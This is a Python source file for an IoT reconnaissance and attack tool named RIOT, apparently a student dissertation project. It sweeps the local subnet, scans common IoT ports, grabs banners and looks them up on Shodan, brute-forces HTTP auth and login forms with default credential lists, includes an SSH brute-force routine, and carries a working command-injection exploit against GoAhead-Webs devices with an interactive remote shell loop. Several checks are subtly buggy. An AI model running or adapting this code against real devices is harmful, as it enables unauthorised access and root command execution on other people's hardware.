#!/usr/bin/env python3
# Title: RIOT [Recon IoT]
# Author: Liam (Stabbxr)
# Website: https://stabber.net
# Github: https://github.com/Stabbxr
# Description: Dissertation Project for University.
# RIOT will automatically detect the local subnet of the network
# your host machine is connected to, loop through a series of common
# ports that are used by attackers to attack 'smart' devices and
# output information recieved from the service.
# Any web-based services that are discovered are checked for common
# directories or configuration files that may not be protected.
# Includes a working PoC for a GoAhead web-server RCE on a 'smart'
# cloud device along with form and default credentail detection to
# check if any online configuration panels can be accessed.
# Banners are sent off to Shodan to discover the total count of other
# devices that are running the same piece of software.
#from .scanners import ssh

# Check to see if all modules are installed on system.
try:
    import socket
    import os
    import subprocess
    import ipaddress
    import requests
    import sys
    import platform
    import re
    import time
    #from pexpect import pxssh # Not supported on windows
    import termcolor
except ModuleNotFoundError:
    exit("Please install requirements.txt (pip install -r requirements.txt")

# Check to see if the Shodan Module exists.
# We don't wanna enforce it but only allow if installed
# will need to add to requirements.txt beforehand to make sure
try:
    from shodan import Shodan

    API_KEY = 'INSERT_API_KEY_HERE'
    SHODAN_API = Shodan(API_KEY)
except ModuleNotFoundError:
    pass

from requests.auth import HTTPBasicAuth
from subprocess import Popen, PIPE
from threading import *

# [IP's for Testing on Home Network]
# 10.10.10.254 : Default Address for CloudHub
# 192.168.0.34 : Home Machine for testing purposes
# 192.168.0.1  : Common Home Router Address
# 192.168.0.254: BTHomeHub Default Address
aliveHosts = []
discoveredPorts = []

# [Usernames & Passwords]
# Login combinations that will be used for the basic
# 'brute-force' against login form or HTTP Auth.
unames = ['admin', 'administrator', 'user', 'guest', 'support']
passwords = ['admin', 'password', 'user', 'guest', 'support']

# Set to 'True' if you would like to see output of what is
# being discovered and processed
DEBUG_MODE = True

# Will automatically scan devices without any prompts there
# shouldn't really be any need to change this.
AUTO_SCAN = True

# Don't ping sweep if a file has been imported
PING_SWEEP = False

# This is automatically try and get a shell for you on the
# GoAhead RCE if the service is determined to be vulnerable
TRY_SHELL = False

# Vulnerability Score
# 1-2 : Low
# 3-5 : Medium
# 5+  : Critical
VULN_COUNT = 0

# ASCII Banner
asciiFart = """
:::::::..   :::    ...   ::::::::::::
;;;;``;;;;  ;;; .;;;;;;;.;;;;;;;;''''
 [[[,/[[['  [[[,[[     \[[,   [[     
 $$$$$$c    $$$$$$,     $$$   $$     
 888b "88bo,888"888,_ _,88P   88,    
 MMMM   "W" MMM  "YMMMMMP"    MMM    

      [Made with <3 By Anonymousst]
           [Version 1.0]
"""

# Clear the screen before we run the scanner for clean output
if ('Windows' in platform.platform() or 'windows' in platform.platform()):
    os.system('cls')
else:
    os.system('clear')

# Print Banner out to terminal
print(asciiFart)
print("======================================")


# Sends banner to shodan API if you have added the API_KEY
# and returns the total amount of devices discovered.
def shodanCheck(banner, port=None):
    try:
        # Search query for Shodan Information
        totalDiscoveredBanners = SHODAN_API.search(str(banner))['total']
        print("[SHODAN] {} Total devices matched: {}".format(str(totalDiscoveredBanners), str(banner)))
    except:
        pass


# [Configuration Check]
# Checks to see if any configuration files exist on the server.
# if the remote service returns anything that isn't 404 then it will
# show the file that has been discovered along with the status code.
discoveredServerFiles = []
discoveredServerFolders = []


def configFileCheck(host):
    try:
        commonDirectories = ['/', '/test/', '/dev/', '/admin/', '/secret/', '/config/', '/backups/', '/backup/']
        commonFiles = ['config.php', 'config.txt', 'config.asp', 'index']
        # Loop over the directories and also the files inside of the directories
        for x in commonDirectories:
            dirRequest = host + x
            dirResponse = requests.get(dirRequest).status_code
            if dirResponse != 404 and dirResponse != 401:
                print("[{}] Folder: {} exists!".format(host, x))
                discoveredServerFolders.append(str(x))
                for y in commonFiles:
                    fileRequest = host + x + y
                    fileResponse = requests.get(fileRequest).status_code
                    if fileResponse != 404:
                        print("[{}] File: {}{} exists!".format(host, x, y))
                        discoveredServerFiles.append(str(y))
            else:
                pass

        # If both of the array are both equal to zero then show no files were discovered
        # on the service.
        if (len(discoveredServerFiles == 0 and len(discoveredServerFolders == 0))):
            print("[{}] No Files Discovered on Service!".format(host))
    except:
        pass


# [File Parser]
# Parse usernames from file if the argument is specified. If not
# then scan the local subnet for alive hosts and continue scanning
# accordinly.
def fileParser(argfile):
    try:
        with open(argfile, 'r') as f:
            if DEBUG_MODE:
                print("[DEBUG] Parsing File: {}".format(str(argfile)))
            for address in f:
                # Create new element of the array based on a newline.
                addr = address.split()
                # Check to see if any words are in the file in either uppercase
                # or lowercase so we don't add them to the array!
                # This can do with a little bit of work but it works at the moment.
                caseCheck = bool(re.match('[a-z]|[A-Z]', address))
                if (caseCheck != True):
                    aliveHosts.extend(addr)
                else:
                    pass
        if DEBUG_MODE:
            print("[DEBUG] Hosts Imported: {}".format(str(len(aliveHosts))))
        return aliveHosts
    except FileNotFoundError:
        exit("[!] {} not found!".format(str(argfile)))


# [Robots Discovery]
# Will check to see if /robots.txt exists on the
# web server. If it does then will display contents
# of the file.
def robotsCheck(url):
    try:
        urlPath = str(url) + "/robots.txt"
        robotsExist = requests.get(urlPath, timeout=2).status_code
        robotsContents = requests.get(urlPath, timeout=2).text
        if (robotsExist == 200):
            print("[{}] /robots.txt Exists!".format(str(url[7:])))
            if DEBUG_MODE:
                print("[DEBUG] {} contents:".format(str(url[7:])))
                print(robotsContents)
        else:
            return
        return
    except:
        pass



# SSH Default credentials check
# Will try a list of known
# and weak logins that often
# get distributed hardcoded into the devices
# Should have functionality to prioritize
# certain combinations over other
# based on mac address of device.

def sshConnect(host, user, password):
    try:
        ssh = pxssh.pxssh()
        ssh.force_password=True
        ssh.login(host, user, password)
        print("Password found! "+ termcolor.colored(user+":" + password, 'green'))
    except pxssh.ExceptionPxssh as error:
        print(error)
    except KeyboardInterrupt as k:
        print("\n")
        print("Terminating")
        print("Reason: Program stopped by user")
        sys.exit(0)

def sshBrute(host):
    """ The actual iteration over credentials happens here"""
    userfile = open('userfile.txt')
    passfile = open('passfile.txt')

    for u in userfile.readlines():
        for p in passfile.readlines():
            user = u.strip("\n")
            password = p.strip("\n")
            print(str(user) + ":" + str(password))
            sshConnect(host, str(user), str(password))
        userfile.close()
        passfile.close()


# [Command Injection Test]
# If we get a sucessful brute-force on the HTTP Auth.
# We can test for RCE via two paths:
#   1. vuln:8000/goform/SystemCommand - POST Request containing Payload.
#   2. vuln:8000/adm/system_command.asp - GET Request to retreive response.
# Small embedded devices that run 'GoAhead-Webs' fall vulnerable to this
# as the service is vulnerable to code execution as root on port 8000.
def commandInjection(url, username, password, hostAddress):
    try:
        postPayload = str(url) + "/goform/SystemCommand"
        getPayload = str(url) + "/adm/system_command.asp"
        # Send Command off to the Server
        requests.post(postPayload, data={'command': 'uname'}, auth=HTTPBasicAuth(username, password))
        # Retreive contents of our command execution.
        payloadResponse = requests.get(getPayload, auth=HTTPBasicAuth(username, password)).text
        parseResponse = \
        payloadResponse.split('<textarea cols="63" rows="20" wrap="off" readonly="1">')[1].split('</textarea></td>')[0]
        if ('Linux' or 'linux' in payloadResponse):
            print("    -> Service is Vulnerable!")

            # Check to see if the user wants to execute commands in a shell-like system
            # If KeyboardInterrupt is hit then break out of the shell and continue on
            # with the scan
            if TRY_SHELL:
                try:
                    print("[!] Spawning Shell")
                    while True:
                        cmd = input(str("$ "))
                        # Send command off to the server
                        requests.post(postPayload, data={'command': cmd}, auth=HTTPBasicAuth(username, password))
                        payloadResponse = requests.get(getPayload, auth=HTTPBasicAuth(username, password)).text
                        parseResponse = \
                        payloadResponse.split('<textarea cols="63" rows="20" wrap="off" readonly="1">')[1].split(
                            '</textarea></td>')[0]
                        print(parseResponse)
                except KeyboardInterrupt:
                    print("[!] Exiting Out of Shell!")
                    time.sleep(1)
                    pass
            if DEBUG_MODE:
                print("[DEBUG] RCE OUTPUT {}".format(str(parseResponse)))
        else:
            print("    Service is NOT Vulnerable")
    except:
        pass


# [Default Credential Check]
# Performs a check to see if default credentials can be used
# on the form that's passed to it with a simple check to see
# if the status code doesn't 200 aka... 401 so we can craft
# HTTP Auth request and see if we get an '200 OK' back
# from the server.
def defaultCredentials(url, hostAddr, statusCode=200):
    # Check to see if we came from HTTP Auth functiuons
    if statusCode != 200:
        # Now we can craft our HTTP auth request
        for x in unames:
            for y in passwords:
                brute = requests.get(url, auth=HTTPBasicAuth(x, y)).status_code
                if (brute == 200):
                    if DEBUG_MODE:
                        print("\n[DEBUG] Login Succeeded with: {}:{}".format(x, y))
                    print("[{}] Service is Vulnerable to Default Credentials!".format(str(url[7:])))
                    # Test for basic RCE
                    checkRCE = input(str("[?] Would you like to test for RCE: ")).upper()
                    if (checkRCE == 'Y' or checkRCE == 'YES'):
                        commandInjection(url, x, y, hostAddr)
                else:
                    print("[{}] Attack Failed".format(str(url[7:])))
    else:
        for x in unames:
            for y in passwords:
                # GET Request for testing purposes so we can add proper login form detection
                request = url + "/" + x + "-" + y
                brute = requests.get(request).status_code
                if (brute == 200):
                    # If we get 200 OK from the server we know that we logged in
                    if DEBUG_MODE:
                        print("\n[DEBUG] Login Succeeded with: {}:{}".format(x, y))
                    print("[{}] Service is Vulnerable to Default Credentials!".format(str(url[7:])))
                    checkRCE = input(str("[?] Would you like to test for RCE: ")).upper()
                    if (checkRCE == 'Y' or checkRCE == 'YES'):
                        commandInjection(url, x, y, hostAddr)
                else:
                    pass
    return


# [HTTP Auth Check]
# Check the server response of a GET request. If so
# foward on the data to defaultCredentails to check
# if the device is vulnerable to common credentials.
def authCheck(url, hostAddress):
    try:
        responseCode = requests.get(url).status_code
        responseText = requests.get(url).text
        if (responseCode == 401):
            print("[{}] HTTP Auth Form Detected!".format(str(hostAddress)))
            wannaBrute = input(str("[*] Attack?: ")).upper()
            if (wannaBrute == 'Y' or wannaBrute == 'YES'):
                defaultCredentials(url, hostAddress, responseCode)
        elif ('login' in responseText or 'submit' in responseText or 'myPlex' in responseText):
            print("[{}] Potential Login Detected!".format(str(url[7:])))
            wannaBrute = input(str("[*] Attack?: ")).upper()
            if (wannaBrute == 'Y' or wannaBrute == 'YES'):
                defaultCredentials(url, hostAddress, responseCode)
        else:
            print("[{}] Attack Failed".format(str(url[7:])))
    except:
        pass


# Check to see if a file has been imported.
if (len(sys.argv) == 2):
    PING_SWEEP = False
    fileParser(sys.argv[1])
else:
    PING_SWEEP = True

# [Getting LAN Address]
# Fetches the local IP address of this host machine
# on your local network. Check the length of the
# address and determine how much of the string to
# strip based on the subnet.


localAddress = [l for l in (
[ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [
    [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in
     [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0]
print("Length of current local address:")
print(len(localAddress))
if len(localAddress) == 13:
    localSubnet = localAddress[:-2] + "0/24"
else:
    localSubnet = localAddress[:-3] + "0/24" # Stripping of the host bits


# [Debug Information]
if DEBUG_MODE:
    print("[DEBUG] Debug Mode: Enabled")
    print("[DEBUG] Architecture:", platform.platform())
    print("[DEBUG] Client Address:", localAddress)
    print("[DEBUG] Local Subnet:", localSubnet)
    print("======================================")

network = ipaddress.ip_network(str(localSubnet))

# [Ping Sweeping]
# For every host in the subnet. Send a single ICMP
# packet with a max timeout of 1 second to see if a
# machine is alive. If alive then append to the
# discoveredHosts array.
if PING_SWEEP:
    for x in network.hosts():
        sys.stdout.write("[~] Scanning: {}\r".format(x))
        if ('Darwin' in platform.platform()):
            req = Popen(['ping', '-c', '1', '-t', '1', str(x)], stdout=PIPE)
            output = req.communicate()[0]
            isAlive = req.returncode
        else:
            req = Popen(['ping', '-n', '1', '-w', '1', str(x)], stdout=PIPE)
            output = req.communicate()[0]
            isAlive = req.returncode
        sys.stdout.flush()

        # If an alive host has been detected then append to our array
        if (isAlive == 0):
            if DEBUG_MODE:
                print("[DEBUG] Discovered: {}!".format(str(x)))
            aliveHosts.append(str(x))

# Show discovered Hosts:
print("\n[*] {} Host(s) on Network: ".format(len(aliveHosts)))
print(", ".join(aliveHosts))
print("")

if AUTO_SCAN:
    # Common IoT Ports that attackers target.
    # 32400 : Plex Media server
    # 7547  : TR-069 (Misfortune Cookie)
    # 3306  : MySQL
    # 8291  : Winbox (RouterOS)
    # 81    : GoAhead Web Server
    # 8545  : Etherium RPC
    webBasedPorts = ['80', '81', '8080', '8181', '8443', '9000', '8000', '32400']
    commonPorts = [32400, 21, 22, 23, 2323, 445, 7547, 8291, 1443, 81, 8545, 3389, 389, 8000, 3306, 80, 1337, 8080,
                   8081, 8443, 65535, 31337, 1234]

    # [Port Checking]
    # Check all alive hosts that we discovered against the list
    # of ports and try to resolve the machines name.
    for host in aliveHosts:
        try:
            resolvedHost = socket.getfqdn(str(host))
            if (resolvedHost != host):
                print("\n[{}] SCAN STARTED!".format(resolvedHost))
            else:
                print("\n[{}] SCAN STARTED!".format(str(host)))
        except KeyboardInterrupt:
            exit("Closing Scanner")

        # [Discovering Listening Ports]
        # Create a network socket to send a TCP packet to the port
        # if we get a response from the service then we know that the
        # port is listening for connections and we can now enumerate
        # to discover more information.
        for port in commonPorts:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.1)  # Set timeout to 100ms so we don't hang
                isOpen = s.connect_ex((str(host), port))
                if (isOpen == 0):
                    discoveredPorts.append(str(port))  #
                    if DEBUG_MODE:
                        print("[{}] Port {} is listening!".format(str(host), int(port)))
                s.close()
            except KeyboardInterrupt:
                exit("Closing Scanner")

        # Ouput all listening port to the user.
        portsOutput = ", ".join(discoveredPorts)
        if (len(discoveredPorts) == 0):
            print("[*] No Ports Listening!")
        else:
            print("[*] {} Port(s)) Listening: {}".format(str(len(discoveredPorts)), portsOutput))
            print("")

        # Call the SSH bruteforcer
        if "22" in discoveredPorts: # If 22 is open, launch sshBrute
            #sshBrute(host)
            pass



        # [Enumerating Banners]
        # Using the list of ports that are listening for connections
        # we can create a socket or send a web request depending on the
        # service.
        # For services such as 80, 443, 81, 8080, 8000, 8181
        # we can use the requests module to easily send GET & POST
        # requests and check the response.
        for banner in discoveredPorts:
            if DEBUG_MODE:
                print("[DEBUG] Grabbing Banner on Port:", banner)
            headers = {'User-Agent': 'RIOT Scanner'}
            # Check over the discovered Web Ports for misconfigurations and other
            # information that can be found.
            if (banner in webBasedPorts):
                try:
                    if DEBUG_MODE:
                        print("[DEBUG] Web Service Discovered on: {}".format(str(banner)))
                    # Craft web request with the supplied port to send to check functions
                    # more efficent rather than having everything in massive if/else nest.
                    webURI = "http://" + str(host) + ":" + str(banner)
                    # Send supplied URI and client address to checker functions to test for
                    # contents and vulnerabilities.
                    robotsCheck(webURI)
                    configFileCheck(webURI)
                    authCheck(webURI, host)
                    # Parse 'server' header from the HTTP response. As we are testing all
                    # HTTP services, rather than opening loads of sockets we can use
                    # requests to parse the header directly from the response.
                    data = requests.get(webURI, headers=headers, timeout=3).headers['server']
                    # Echo discovered banner back to the user.
                    print("[{}] Port: {} | Banner: {}".format(host, banner, str(data)))
                    # Send discovered banner to the Shodan API
                    shodanCheck(data, banner)
                except:
                    if DEBUG_MODE:
                        print("[DEBUG] Port: {} | Unable to Grab Banner".format(banner))
                    pass
            else:
                # If the listening services does not fall under the catagory of a web service.
                # then we can open a socket and send some data to the address and port and view
                # what information the service gives back to us.]
                try:
                    createSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    createSocket.connect((host, int(banner)))
                    createSocket.send(b'RIOT SCANNER BANNER GRABBING TEST\r\n')
                    createSocket.settimeout(1)
                    socketResponse = createSocket.recv(1024)
                    # Check the server response for strings that could mean either an
                    # DVR / IP Camera, Plex Media Server or Raspberry Pi Device.
                    # Quite a few smart devices use similar software that can be easily
                    # installed on a RPI. Such as media server software, ip camera software
                    if DEBUG_MODE:
                        if ('Raspbian' in str(socketResponse)):
                            print("[DEBUG] Raspberry Pi Device Detected!")
                        elif ('Plex-Protocol' in str(socketResponse) and banner == str(32400)):
                            print("[DEBUG] PLeX Media Server Detected!")
                        else:
                            pass
                    else:
                        pass
                    print("[{}] Port: {} | Banner: {}".format(host, banner, str(socketResponse)))
                    # Send discovered response to Shodan for futher discovery.
                    shodanCheck(str(socketResponse), str(banner))
                except:
                    if DEBUG_MODE:
                        print("[DEBUG] Port: {} | Unable to Grab Banner".format(banner))
                    pass
        # After every iteration we need to clear the list of discovered ports so
        # that we dont have duplicates
        discoveredPorts.clear()
        # Tell client that we have finished scanning the given host.
        print("[{}] Finished Scan.".format(str(host)))
    print("\n[Thank you for using!]")
else:
    exit()
